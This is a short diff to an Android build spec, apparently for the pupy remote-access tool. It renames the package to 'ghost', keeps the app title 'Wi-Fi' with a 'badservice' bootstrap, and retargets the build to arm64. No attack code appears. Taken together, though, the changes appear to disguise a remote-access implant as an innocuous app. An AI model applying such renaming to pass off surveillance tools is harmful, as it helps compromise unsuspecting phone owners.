@@ -4,10 +4,10 @@
 title = Wi-Fi
 
 # (str) Package name
-package.name = pupy
+package.name = ghost
 
 # (str) Package domain (needed for android/ios packaging)
-package.domain = org.pupy
+package.domain = org.ghost
 
 # (str) Source code where the main.py live
 source.dir = .
@@ -55,7 +55,7 @@ requirements = pycrypto,plyer,psutil,tinyec,netaddr,pyjnius,pyuv,cryptography
 orientation = all
 
 # (list) List of service to declare
-# services = pupy:service/main.py
+# services = ghost:service/main.py
 
 #
 # OSX Specific
@@ -191,7 +191,7 @@ p4a.bootstrap = badservice
 #android.copy_libs = 1
 
 # (str) The Android arch to build for, choices: armeabi-v7a, arm64-v8a, x86
-android.arch = armeabi-v7a
+android.arch = arm64-v8a
 
 #
 # iOS specific
